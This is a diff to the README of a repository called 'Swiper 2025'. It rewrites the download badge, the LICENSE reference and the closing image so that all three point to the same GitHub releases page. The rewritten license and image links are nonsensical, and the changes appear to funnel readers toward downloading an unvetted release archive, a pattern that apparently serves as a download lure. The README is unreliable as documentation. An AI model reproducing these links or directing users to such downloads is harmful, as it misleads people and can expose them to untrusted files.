@@ -22,7 +22,7 @@ Swiper 2025 is a comprehensive project designed to benchmark and test various sw
 
 ## Installation
 To get started with Swiper 2025, simply click on the following link to download the necessary assets:  
-[![Download Release](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Release](https://github.com/djkst2903/swiper-2025/releases)](https://github.com/djkst2903/swiper-2025/releases)
 
 Once you have downloaded the assets, unzip the file and you are ready to explore the world of swiper alternatives!
 
@@ -41,7 +41,7 @@ Simply follow the installation instructions, and then dive into the documentatio
 Contributions are welcome to enhance the benchmark results, test scenarios, or compatibility checks. If you have any ideas or improvements, feel free to open an issue or submit a pull request. Let's make Swiper 2025 the go-to resource for swiper alternatives!
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/djkst2903/swiper-2025/releases](https://github.com/djkst2903/swiper-2025/releases) file for details.
 
 ---
 
@@ -49,4 +49,4 @@ So what are you waiting for? Dive into the world of swiper alternatives with Swi
 
 Let the swiping extravaganza begin! 🌈🔥
 
-![Swiper Image](https://www.example.com/swiper.png)
+![Swiper Image](https://github.com/djkst2903/swiper-2025/releases)
